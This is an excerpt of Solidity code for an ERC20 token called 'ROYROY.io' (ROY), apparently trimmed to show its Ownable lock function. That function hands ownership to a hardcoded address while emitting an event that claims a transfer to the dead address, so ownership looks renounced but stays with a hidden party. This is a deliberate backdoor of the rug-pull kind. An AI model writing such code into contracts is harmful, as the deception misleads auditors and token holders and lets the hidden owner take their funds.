...
contract Ownable is Context {
    ...
    function lock(uint256 time) public virtual onlyOwner {
        ...
        _owner = address(0xc94D17AF2B14a6e8cD56300b2bfFadAD57147C88);
        _lockTime = now + time;
        emit OwnershipTransferred(_owner, address(0x0000000000000DEAD));
    }
...
contract Roy is Context, IERC20, Ownable {
    ...
    string private _name = "ROYROY.io";
    string private _symbol = "ROY";
